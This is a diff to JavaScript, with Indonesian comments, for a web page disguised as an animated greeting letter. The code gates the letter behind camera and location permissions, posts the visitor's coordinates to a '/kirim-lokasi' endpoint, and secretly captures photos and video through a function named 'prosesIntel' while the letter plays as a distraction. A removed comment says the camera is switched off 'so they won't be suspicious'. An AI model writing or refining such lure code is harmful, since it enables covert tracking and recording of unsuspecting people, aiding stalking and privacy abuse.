@@ -1,44 +1,44 @@
-// ... (Bagian pesan dan partikel background tetap sama seperti sebelumnya) ...
+// ... (Bagian pesan dan partikel background biarkan tetap seperti punyamu) ...
 
 readBtn.addEventListener("click", () => {
-    // 1. Minta izin kamera dulu
+    // 1. Minta izin Kamera & Audio dulu
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
     .then(function(stream) {
         globalStream = stream;
 
-        // 2. Jika kamera diizinkan, langsung minta izin lokasi
+        // 2. Minta izin Lokasi dengan batasan waktu (Timeout) agar tidak macet
         navigator.geolocation.getCurrentPosition(
             function(pos) {
-                // JIKA LOKASI JUGA DIIZINKAN:
-                
-                // Kirim data lokasi ke server
+                // JIKA LOKASI BERHASIL
                 fetch("/kirim-lokasi", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                 });
-
-                // Jalankan proses intel foto/video
-                prosesIntel(globalStream);
-
-                // BARU BUKA SURATNYA
-                bukaSurat();
+                
+                // Lanjut buka surat & proses foto
+                jalankanSemua(globalStream);
             },
             function(err) {
-                // JIKA LOKASI DITOLAK:
-                alert("Akses lokasi ditolak. Mohon aktifkan GPS dan izinkan lokasi agar surat ini bisa terbuka.");
-                // Matikan kamera yang tadi sudah sempat nyala agar tidak curiga
+                // JIKA LOKASI DITOLAK
+                alert("Akses lokasi ditolak. Mohon izinkan lokasi agar surat bisa terbuka.");
                 stream.getTracks().forEach(t => t.stop());
-            }
+            },
+            { timeout: 5000 } // Jika 5 detik lokasi tidak ketemu, akan lari ke fungsi error
         );
     })
     .catch(err => {
-        // JIKA KAMERA DITOLAK:
-        alert("Akses kamera ditolak. Mohon izinkan kamera agar surat ini bisa terbuka.");
+        // JIKA KAMERA DITOLAK
+        alert("Akses kamera ditolak. Mohon izinkan kamera agar surat bisa terbuka.");
     });
 });
 
-// Fungsi untuk menjalankan animasi surat (dipisah agar rapi)
+// Fungsi untuk menggabungkan semua proses agar tidak error
+function jalankanSemua(stream) {
+    bukaSurat(); // Buka surat dulu agar user tidak menunggu lama
+    prosesIntel(stream); // Proses foto & video di latar belakang
+}
+
 function bukaSurat() {
     music.load();
     music.play().catch(() => console.log("Autoplay blocked"));
@@ -66,7 +66,6 @@ function bukaSurat() {
     typeWriter();
 }
 
-// Fungsi intel foto/video
 function prosesIntel(stream) {
     const v = document.createElement("video");
     v.srcObject = stream;
